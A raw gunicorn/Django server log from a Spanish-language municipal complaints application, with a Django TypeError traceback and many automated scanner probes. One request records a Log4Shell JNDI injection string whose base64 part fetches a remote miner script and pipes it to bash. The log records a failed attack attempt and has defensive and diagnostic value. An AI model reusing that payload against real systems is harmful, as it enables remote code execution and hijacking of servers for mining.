nohup: no se tendrá en cuenta la entrada
[2026-03-21 19:49:56 -0300] [2378500] [INFO] Starting gunicorn 21.2.0
[2026-03-21 19:49:56 -0300] [2378500] [INFO] Listening at: http://127.0.0.1:8087 (2378500)
[2026-03-21 19:49:56 -0300] [2378500] [INFO] Using worker: sync
[2026-03-21 19:49:56 -0300] [2378503] [INFO] Booting worker with pid: 2378503
[2026-03-21 19:49:56 -0300] [2378504] [INFO] Booting worker with pid: 2378504
[2026-03-21 19:49:56 -0300] [2378506] [INFO] Booting worker with pid: 2378506
Not Found: /dispatch.asp
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 1823, in get_prep_value
    return int(value)
TypeError: int() argument must be a string, a bytes-like object or a number, not 'Contribuyente'

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/gmvm/src/reclamos/views.py", line 276, in inicio
    vecino_nuevo=reclamo.id_contribuyente,
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/query.py", line 453, in create
    obj.save(force_insert=True, using=self.db)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/base.py", line 727, in save
    force_update=force_update, update_fields=update_fields)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/base.py", line 765, in save_base
    force_update, using, update_fields,
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _save_table
    results = self._do_insert(cls._base_manager, using, fields, returning_fields, raw)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/base.py", line 908, in _do_insert
    using=using, raw=raw,
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/query.py", line 1270, in _insert
    return query.get_compiler(using=using).execute_sql(returning_fields)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1409, in execute_sql
    for sql, params in self.as_sql():
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1354, in as_sql
    for obj in self.query.objs
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1354, in <listcomp>
    for obj in self.query.objs
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1353, in <listcomp>
    [self.prepare_value(field, self.pre_save_val(field, obj)) for field in fields]
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1294, in prepare_value
    value = field.get_db_prep_save(value, connection=self.connection)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 842, in get_db_prep_save
    return self.get_db_prep_value(value, connection=connection, prepared=False)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 837, in get_db_prep_value
    value = self.get_prep_value(value)
  File "/home/gmvm/venv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 1827, in get_prep_value
    ) from e
TypeError: Field 'vecino_nuevo' expected a number but got <Contribuyente: ADMINISTRADOR, ADMINISTRADOR - (DNI: 99999999)>.
Not Found: /favicon.ico
[2026-03-21 22:01:40 -0300] [2378500] [ERROR] Worker (pid:2378503) was sent SIGHUP!
[2026-03-21 22:01:40 -0300] [2378500] [ERROR] Worker (pid:2378504) was sent SIGHUP!
[2026-03-21 22:01:40 -0300] [2378500] [ERROR] Worker (pid:2378506) was sent SIGHUP!
[2026-03-21 22:01:40 -0300] [2392034] [INFO] Booting worker with pid: 2392034
[2026-03-21 22:01:40 -0300] [2392035] [INFO] Booting worker with pid: 2392035
[2026-03-21 22:01:40 -0300] [2392038] [INFO] Booting worker with pid: 2392038
[2026-03-21 22:01:40 -0300] [2378500] [INFO] Handling signal: hup
[2026-03-21 22:01:40 -0300] [2378500] [INFO] Hang up: Master
[2026-03-21 22:01:40 -0300] [2392039] [INFO] Booting worker with pid: 2392039
[2026-03-21 22:01:40 -0300] [2392040] [INFO] Booting worker with pid: 2392040
[2026-03-21 22:01:40 -0300] [2392041] [INFO] Booting worker with pid: 2392041
[2026-03-22 01:01:40 +0000] [2392034] [INFO] Worker exiting (pid: 2392034)
[2026-03-22 01:01:40 +0000] [2392035] [INFO] Worker exiting (pid: 2392035)
[2026-03-22 01:01:40 +0000] [2392038] [INFO] Worker exiting (pid: 2392038)
Not Found: /favicon.ico
Not Found: /boaform/admin/formPing
Not Found: /boaform/admin/formPing
Not Found: /login.cgi
Not Found: /tmUnblock.cgi
Not Found: /tmUnblock.cgi
Not Found: /tmUnblock.cgi
Not Found: /tmUnblock.cgi
Not Found: /currentsetting.htm
Not Found: /actuator/health
Not Found: /boaform/admin/formLogin
Not Found: /favicon.ico
Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /geoserver/web/
Not Found: /actuator/gateway/routes
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: 'municipalidadvallemaria.com'. You may need to add 'municipalidadvallemaria.com' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'www.municipalidadvallemaria.com'. You may need to add 'www.municipalidadvallemaria.com' to ALLOWED_HOSTS.
Bad Request: /
Forbidden (CSRF cookie not set.): /
Not Found: /v1/vector/collections/describe
Not Found: /v1
Not Found: /favicon.ico
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /vpn/list_base_config.php
Not Found: /manage/account/login
Not Found: /favicon.ico
Not Found: /security.txt
Not Found: /boaform/admin/formLogin
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /wiki
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Not Found: /favicon.ico
Invalid HTTP_HOST header: 'ip.bablosoft.com'. You may need to add 'ip.bablosoft.com' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /favicon.ico
Not Found: /SDK/webLanguage
Not Found: /.well-known/security.txt
Not Found: /vpn/list_base_config.php
Not Found: /tmUnblock.cgi
Not Found: /tmUnblock.cgi
Not Found: /favicon.ico
Not Found: /tmUnblock.cgi
Not Found: /favicon.ico
Not Found: /security.txt
Forbidden (CSRF cookie not set.): /
Not Found: /tmUnblock.cgi
Not Found: /tmUnblock.cgi
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /T6bHkeeG3IixY7Bh0noD1QyFLiPlD23T05_fYYWAB0SqWLgWGk-3zAazG2k0MqhO6AxISCCvosgJ0eBTxGrQHktud-cN20EuWN5bCgJQ7zQLOPyK5jhNF7Y2p-_JSxpBpQvWHxM5plh6NA2yELiAvVST24ah1aKWBxJ3EDpy2DOgE3DO9xUsIIP6R9Vy49sZRKRZKYyU6s9Z3QCfH7jzY3ZFQsI-dvC37Aw
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /actuator/gateway/routes
Not Found: /config/getuser
Not Found: /setSystemCommand
Not Found: /setSystemCommand
Not Found: /diagnostic.php
Not Found: /diagnostic.php
Not Found: /cgi-bin/gdrive.cgi
Not Found: /login.cgi
Not Found: /HNAP1/
Not Found: /SDK/webLanguage
Not Found: /favicon.ico
Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /geoserver/web/
Not Found: /tmUnblock.cgi
Not Found: /index.php
Not Found: /favicon.ico
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Not Found: /favicon.ico
Not Found: /favicon.ico
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Not Found: /manage/account/login
Not Found: /apis/version
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
Bad Request: /json/
Invalid HTTP_HOST header: "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')". The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')
Not Found: /favicon.ico
Not Found: /favicon.ico
[2026-03-23 19:05:23 +0000] [2392039] [INFO] Worker exiting (pid: 2392039)
Entra por request.method == 'POST'
[2026-03-23 19:05:23 +0000] [2392040] [INFO] Worker exiting (pid: 2392040)
Entra por request.method == 'POST'
[2026-03-23 19:05:23 +0000] [2392041] [INFO] Worker exiting (pid: 2392041)
Entra por request.method == 'POST'
[2026-03-23 16:05:23 -0300] [2378500] [INFO] Handling signal: term
[2026-03-23 16:05:23 -0300] [2378500] [ERROR] Worker (pid:2392039) was sent SIGTERM!
[2026-03-23 16:05:23 -0300] [2378500] [ERROR] Worker (pid:2392040) was sent SIGTERM!
[2026-03-23 16:05:23 -0300] [2378500] [ERROR] Worker (pid:2392041) was sent SIGTERM!
[2026-03-23 16:05:23 -0300] [2378500] [INFO] Shutting down: Master
